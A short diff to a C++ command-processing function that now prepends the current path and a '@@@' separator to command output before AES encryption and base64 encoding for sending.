@@ -26,8 +26,11 @@ void process_command(const char* fullMessage, struct thData tdL,
     std::string command_output;
     command_output = interpret_command(decrypted_ciphertext, path);
 
+    // Adding the path to the message
+    std::string output_with_path = path + "@@@" + command_output;
+
     // Encrypt the message
-    std::string encrypted = aes_encrypt(command_output, aes_key);
+    std::string encrypted = aes_encrypt(output_with_path, aes_key);
     encrypted = base64_encode(encrypted);
 
     // Send the message.
